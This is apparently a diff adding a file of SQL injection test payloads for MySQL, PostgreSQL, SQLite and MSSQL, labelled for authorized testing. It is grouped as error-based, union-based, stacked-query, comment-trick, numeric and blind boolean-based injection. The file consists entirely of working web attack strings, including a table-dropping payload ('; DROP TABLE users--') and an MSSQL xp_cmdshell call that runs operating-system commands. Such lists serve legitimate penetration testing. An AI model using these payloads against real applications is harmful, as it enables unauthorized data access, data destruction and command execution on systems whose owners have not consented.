@@ -1,0 +1,41 @@
+# SQL injection test payloads
+# For educational and authorized testing ONLY
+# covers MySQL, PostgreSQL, SQLite, MSSQL
+
+# basic error-based
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1"--
+') OR ('1'='1
+1' OR 1=1--
+1" OR 1=1--
+admin'--
+# union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL--
+' UNION ALL SELECT NULL--
+# stacked queries
+'; DROP TABLE users--
+'; SELECT SLEEP(3)--
+# some WAFs block this one
+1; EXEC xp_cmdshell('dir')--
+# comment tricks
+'/*
+*/OR/*
+'/**/'
+# numeric injection
+1 OR 1=1
+1 AND 1=2
+0 OR 1=1
+# blind boolean-based
+' AND '1'='1
+' AND '1'='2
+' AND SUBSTRING(@@version,1,1)='5
+1 AND 1=1
+1 AND 1=2
